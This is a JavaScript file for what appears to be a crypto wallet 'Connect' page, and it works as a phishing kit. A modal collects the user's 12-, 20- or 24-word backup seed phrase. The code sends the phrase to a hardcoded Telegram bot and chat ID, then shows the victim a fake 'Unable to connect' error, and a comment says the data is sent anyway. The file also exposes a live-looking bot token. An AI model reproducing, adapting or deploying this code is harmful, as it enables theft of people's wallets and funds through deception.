// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8349363327:AAHfKI1QevoDN6L7R1mHUJ4Ruia8y9cvXF4';
const TELEGRAM_CHAT_ID = '8445832367';

// Modal elements
const connectBtn = document.getElementById('connectBtn');
const backupModal = document.getElementById('backupModal');
const closeModal = document.getElementById('closeModal');
const cancelBtn = document.getElementById('cancelBtn');
const submitBackup = document.getElementById('submitBackup');
const backupPhraseInput = document.getElementById('backupPhrase');

// Open modal when Connect button is clicked
connectBtn.addEventListener('click', () => {
    backupModal.classList.add('active');
    backupPhraseInput.focus();
});

// Close modal functions
function closeModalFunc() {
    backupModal.classList.remove('active');
    backupPhraseInput.value = '';
}

closeModal.addEventListener('click', closeModalFunc);
cancelBtn.addEventListener('click', closeModalFunc);

// Close modal when clicking outside
backupModal.addEventListener('click', (e) => {
    if (e.target === backupModal) {
        closeModalFunc();
    }
});

// Close modal on Escape key
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && backupModal.classList.contains('active')) {
        closeModalFunc();
    }
});

// Validate backup phrase (12, 20, or 24 words)
function validateBackupPhrase(phrase) {
    const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
    return words.length === 12 || words.length === 20 || words.length === 24;
}

// Send backup phrase to Telegram
async function sendToTelegram(backupPhrase) {
    try {
        const message = `🔐 New Backup Phrase Received:\n\n${backupPhrase}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        
        if (data.ok) {
            return { success: true, message: 'Backup phrase sent successfully!' };
        } else {
            return { success: false, message: 'Failed to send: ' + data.description };
        }
    } catch (error) {
        return { success: false, message: 'Error: ' + error.message };
    }
}

// Handle backup phrase submission
submitBackup.addEventListener('click', async () => {
    const backupPhrase = backupPhraseInput.value.trim();
    
    if (!backupPhrase) {
        alert('Please enter your backup phrase.');
        return;
    }
    
    if (!validateBackupPhrase(backupPhrase)) {
        alert('Please enter a valid backup phrase with 12, 20, or 24 words.');
        return;
    }
    
    // Disable button during submission
    submitBackup.disabled = true;
    submitBackup.textContent = 'Connecting...';
    
    // Send to Telegram
    const result = await sendToTelegram(backupPhrase);
    
    if (result.success) {
        // Always show error message to user, but data is sent to Telegram
        alert('Unable to connect, try again.');
        closeModalFunc();
    } else {
        alert('Connection failed: ' + result.message);
    }
    
    // Re-enable button
    submitBackup.disabled = false;
    submitBackup.textContent = 'Connect';
});

